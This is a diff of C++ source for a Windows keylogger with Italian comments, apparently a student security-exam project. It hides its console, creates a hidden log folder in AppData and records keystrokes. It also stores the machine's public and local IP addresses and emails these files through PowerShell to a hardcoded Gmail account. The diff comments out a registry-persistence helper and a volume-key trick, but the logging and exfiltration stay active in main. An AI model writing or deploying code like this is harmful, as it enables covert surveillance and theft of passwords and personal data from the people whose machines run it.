@@ -13,7 +13,7 @@
 #include <stdio.h>
 using namespace std;
 //Variabili Globali
-string location;
+//string location;
 string systemuser;
 string Email_To_Recieve_On = "sofsecexam2022@gmail.com";
 string Email_To_Send_From = "sofsecexam2022@gmail.com";
@@ -111,17 +111,18 @@ void sendinfo(void) ///Avvia la  powershell ed esegue lo script per inviare l'em
     sendemail(Email_To_Send_From, "Public IP", Password_Of_Sender_Email, "Public IP", Email_To_Recieve_On, "%USERPROFILE%\\AppData\\Roaming\\Logs\\publicip.txt");
 }
 
-void getlocation(void) //trova la directory corrente dell'applicazione
+//utile per la permanenza nei registri di windows
+/*void getlocation(void) //trova la directory corrente dell'applicazione
 {
     char tuh[_MAX_PATH];
     char *abc;
     abc = getcwd(tuh, sizeof(tuh));
     location = abc;
-}
+}*/
 
 //check per la partenza del programma appere la barra del volume
 
-void turnofvoice()
+/*void turnofvoice()
 {
     INPUT ip = {0};
     ip.type = INPUT_KEYBOARD;
@@ -129,7 +130,7 @@ void turnofvoice()
     SendInput(1, &ip, sizeof(INPUT));
     ip.ki.dwFlags = KEYEVENTF_KEYUP;
     SendInput(1, &ip, sizeof(INPUT));
-}
+}*/
 
 //SEZIONE KEYLOGGER
 void keylog(void) //Key logger
@@ -342,8 +343,8 @@ int main()
 {
     hideconsole();
     system("mkdir %USERPROFILE%\\AppData\\Roaming\\Logs");
-    turnofvoice();
-    getlocation();
+    //turnofvoice();
+    //getlocation();
     getusername();
     storexternalip();
     storeipddress();
